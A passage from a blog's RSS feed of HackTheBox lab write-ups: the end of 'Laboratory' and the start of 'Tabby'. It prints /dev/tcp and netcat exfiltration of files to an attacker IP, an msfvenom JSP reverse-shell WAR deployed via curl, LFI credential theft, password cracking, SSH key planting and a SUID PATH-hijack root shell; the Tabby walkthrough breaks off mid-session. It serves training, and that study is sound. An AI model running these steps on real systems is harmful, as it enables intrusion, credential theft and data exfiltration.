</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
</span></span></code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span></code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span></code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</span></span></code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
</span></span></code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ tar -xzf exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mkdir .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mv * .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git init
</span></span><span class="line"><span class="cl">Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">On branch master
</span></span><span class="line"><span class="cl">Changes to be committed:
</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
</span></span><span class="line"><span class="cl">        deleted:    README.md
</span></span><span class="line"><span class="cl">        deleted:    create_gitlab.sh
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">        deleted:    dexter/recipe.url
</span></span><span class="line"><span class="cl">        deleted:    dexter/todo.txt
</span></span></code></pre></div><p>This repository contains a set of SSH keys that have been deleted. I can restore these with <code>git checkout --</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git checkout --
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
</span></span></code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the <code>echo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
</span></span><span class="line"><span class="cl">dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</span></span></code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">dexter@laboratory:~$
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
</span></span><span class="line"><span class="cl">laboratory
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ cat dexter/todo.txt
</span></span><span class="line"><span class="cl"><span class="c1"># DONE: Secure docker for regular users</span>
</span></span><span class="line"><span class="cl"><span class="c1">### DONE: Automate docker security on startup</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
</span></span></code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
</span></span></code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ ltrace docker-security 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</span></span></code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</span></span></code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ which chmod
</span></span><span class="line"><span class="cl">/dev/shm/chmod
</span></span></code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ docker-security 
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm#
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm# cut -c6- /root/root.txt 
</span></span><span class="line"><span class="cl">9f593f335a0a1f403c753719eb6
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tabby</title>
      <link>https://fahmifj.github.io/hackthebox/tabby/</link>
      <pubDate>Sat, 07 Nov 2020 13:34:34 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/tabby/</guid>
      <description>Abusing Tomcat manager-script roles and escalate to root with LXC container</description>
      <content:encoded><![CDATA[<p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Local File Inclusion</li>
<li>Abusing Tomcat <code>manager-script</code> roles</li>
<li>Privilege escalation with lxc/lxd group.</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
<li>curl - Preinstalled in Kali Linux</li>
<li>msfvenom - Preinstalled in Kali Linux</li>
<li>alpine-builder - <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mega Hosting
</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache Tomcat
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
</span></span></code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p>
<p><div class="img-container"><img src="imgs/19847b521b1c48b08f57e8e4986fcc06.png" alt="19847b521b1c48b08f57e8e4986fcc06"  /></div>
</p>
<p>The domain name of this site is revealed from the email address and also from the page source</p>
<p><div class="img-container"><img src="imgs/image-20210426220259010.png" alt="image-20210426220259010"  /></div>
</p>
<p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.10.194 megahosting.htb
</span></span></code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210426215350459.png" alt="image-20210426215350459"  /></div>
</p>
<p>They mentioned a tool, but I have no idea what tool it is.</p>
<p>I ran gobuster but found nothing really interesting there.</p>
<h3 id="tcp-8080---tomcat">TCP 8080 - Tomcat</h3>
<p>Visiting port 8080 shows the Tomcat default page.</p>
<p><div class="img-container"><img src="imgs/09afc545cd1943dbb578574d338d0943.png" alt="09afc545cd1943dbb578574d338d0943"  /></div>
</p>
<p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p>
<p><div class="img-container"><img src="imgs/0aedd7409c3444a3bb359bb837b33c93.png" alt="0aedd7409c3444a3bb359bb837b33c93"  /></div>
</p>
<p>I&rsquo;ll take note on these:</p>
<ul>
<li>/etc/tomcat9/tomcat-users.xml</li>
<li>&ldquo;tomcat9&rdquo;</li>
</ul>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="getting-tomcat-credentials-via-lfi">Getting tomcat Credentials via LFI</h4>
<p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p>
<blockquote>
<p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p>
</blockquote>
<img src="imgs/42fb887abe344db48a138d3b7707cf5d.png" alt="42fb887abe344db48a138d3b7707cf5d" style="zoom:80%;" />
<p>This can be leveraged to read  <code>tomcat-users.xml</code> under <code>/etc/tomcat9/</code> . But, the file is not there, it returns a blank page.</p>
<img src="imgs/efc8b8670fa0473085bfd66dad7670f2.png" alt="efc8b8670fa0473085bfd66dad7670f2" style="zoom:80%;" />
<p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p>
<p>First, in Linux, every software application is most likely installed in one of the following directories:</p>
<ul>
<li><code>/usr/share/appname</code></li>
<li><code>/usr/lib/appname</code></li>
<li><code>/opt/appname</code></li>
<li><code>/var/lib/appname</code></li>
</ul>
<p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=OpenSSH+8.2p1&amp;searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=apache2+2.4.41&amp;searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=tomcat9&amp;searchon=all">search</a>, and find the install location of <a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">Tomcat9 on Ubuntu 20.04</a>.</p>
<p>The search came up with this path <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>. When I visit that path, I get the following results:</p>
<p><div class="img-container"><img src="imgs/531dc2a899f54b368f3fdadb83623272.png" alt="531dc2a899f54b368f3fdadb83623272"  /></div>
</p>
<p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p>
<h4 id="html-gui---host-manager-webapp">HTML GUI - host-manager-webapp</h4>
<p>When I tried to access the host-manager-webapp with default credentials, the page says something about the roles that concerns me.</p>
<p><div class="img-container"><img src="imgs/image-20210426232907769.png" alt="image-20210426232907769"  /></div>
</p>
<p>So, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p>
<p><div class="img-container"><img src="imgs/102088bcbb8b46a79a0f333b027bcaa2.png" alt="102088bcbb8b46a79a0f333b027bcaa2"  /></div>
</p>
<p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization.</p>
<p><div class="img-container"><img src="imgs/314b3cdbc1964a699afeb20044dbc792.png" alt="314b3cdbc1964a699afeb20044dbc792"  /></div>
</p>
<p>So, I think I can access some features behind <code>/manager/[here]</code>.</p>
<h4 id="deploying-malicious-war-file">Deploying Malicious WAR file</h4>
<p>The second role of user tomcat is <code>manager-script</code>. <a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">This article</a> explains that <code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI. The full documentation of what you can do with this role can be read <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">here</a>.</p>
<p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with JSP reverse shell.</p>
<p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.30 <span class="nv">lport</span><span class="o">=</span><span class="m">9000</span> -f war -o iamf.war
</span></span></code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span class="o">=</span>/iamf.war
</span></span></code></pre></div><ul>
<li><code>-u</code> : for credential [username:password]</li>
<li><code>-T</code> : for transfer file</li>
</ul>
<p>I&rsquo;ll setup a listener, and then trigger the payload also using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ curl http://10.10.10.194:8080/iamf.war
</span></span></code></pre></div><p>My listener now have a shell.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png" alt="img"  /></div>
</p>
<p>I can upgrade the shell into TTY using this trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ script /dev/null<span class="p">;</span> bash
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-ash">Shell as ash</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc&#39;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/47eaa7bb176b445fa6a091ac49e5f32f.png" alt="47eaa7bb176b445fa6a091ac49e5f32f"  /></div>
</p>
<p>I&rsquo;ll transfer the backup file to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
</span></span></code></pre></div><p>And receive it on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span> &gt; 16162020_backup.zip
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.30<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194<span class="o">]</span> <span class="m">65056</span>
</span></span></code></pre></div><h4 id="recover-backup-password">Recover Backup Password</h4>
<p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ zip2john 16162020_backup.zip &gt; backup.hash
</span></span></code></pre></div><p>The password got cracked instantly.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ john.exe --wordlist<span class="o">=</span>rockyou.txt backup.hash
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/3538b21b4a734a6981f21967db4e87fa.png" alt="3538b21b4a734a6981f21967db4e87fa"  /></div>
</p>
<p>The password is <code>admin@it</code>.</p>
<h4 id="su---ash">SU - ash</h4>
<p>It turns out that the backup password is reused by <code>ash</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@tabby:/$ su ash
</span></span><span class="line"><span class="cl">su ash
</span></span><span class="line"><span class="cl">Password: admin@it
</span></span></code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~/.ssh$ <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=&#39;</span> &gt; authorized_keys
</span></span></code></pre></div><p>Now I can login with my key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa ash@10.10.10.194
</span></span><span class="line"><span class="cl">ash@tabby:~$                                                                 
</span></span><span class="line"><span class="cl">ash@tabby:~$ sudo -l
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ash:                                                                   
</span></span><span class="line"><span class="cl">Sorry, user ash may not run sudo on tabby.
</span></span><span class="line"><span class="cl">ash@tabby:~$ id
